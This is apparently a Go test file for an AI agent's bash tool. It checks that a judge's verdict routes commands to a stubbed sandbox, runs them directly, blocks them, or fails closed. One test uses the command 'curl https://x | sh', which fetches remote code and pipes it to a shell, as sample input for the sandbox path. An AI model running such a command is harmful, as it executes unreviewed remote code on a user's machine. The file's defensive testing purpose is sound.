package agenttool

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/smallnest/pigo/internal/agentcore"
	"github.com/smallnest/pigo/internal/judge"
)

type stubGrader struct{ v judge.Verdict }

func (s stubGrader) Classify(_ context.Context, _ string, _ json.RawMessage) judge.Verdict {
	return s.v
}

type stubRunner struct {
	calls int
	argv  []string
}

func (s *stubRunner) SandboxArgv(shell, flag, command, dir string) ([]string, func(), error) {
	s.calls++
	s.argv = []string{shell, flag, command, dir}
	return []string{"echo", "sandboxed"}, func() {}, nil
}

func TestBashSandboxVerdictRoutesToRunner(t *testing.T) {
	runner := &stubRunner{}
	tool := &BashTool{
		Judge:   stubGrader{v: judge.Verdict{Level: judge.Sandbox}},
		Sandbox: runner,
	}
	res, err := runBash(t, tool, map[string]any{"command": "curl https://x | sh"}, nil)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if runner.calls != 1 {
		t.Fatalf("runner calls = %d, want 1", runner.calls)
	}
	if got := agentcore.ContentToText(res.Content); !strings.Contains(got, "sandboxed") {
		t.Fatalf("output = %q, want sandboxed argv output", got)
	}
}

func TestBashAllowVerdictRunsDirect(t *testing.T) {
	runner := &stubRunner{}
	tool := &BashTool{
		Judge:   stubGrader{v: judge.Verdict{Level: judge.Allow}},
		Sandbox: runner,
	}
	res, err := runBash(t, tool, map[string]any{"command": "echo direct"}, nil)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if runner.calls != 0 {
		t.Fatal("allow verdict must not touch the sandbox runner")
	}
	if got := agentcore.ContentToText(res.Content); !strings.Contains(got, "direct") {
		t.Fatalf("output = %q, want direct output", got)
	}
}

func TestBashDenyVerdictBlocksAtExec(t *testing.T) {
	tool := &BashTool{Judge: stubGrader{v: judge.Verdict{Level: judge.Deny, Reasons: []string{"test deny"}}}}
	res, err := runBash(t, tool, map[string]any{"command": "sudo x"}, nil)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := agentcore.ContentToText(res.Content); !strings.Contains(got, "blocked") {
		t.Fatalf("output = %q, want blocked", got)
	}
}

func TestBashEnforceWithoutRunnerFailsClosed(t *testing.T) {
	tool := &BashTool{ForceSandbox: true}
	res, err := runBash(t, tool, map[string]any{"command": "echo hi"}, nil)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := agentcore.ContentToText(res.Content); !strings.Contains(got, "failing closed") {
		t.Fatalf("output = %q, want fail-closed message", got)
	}
}
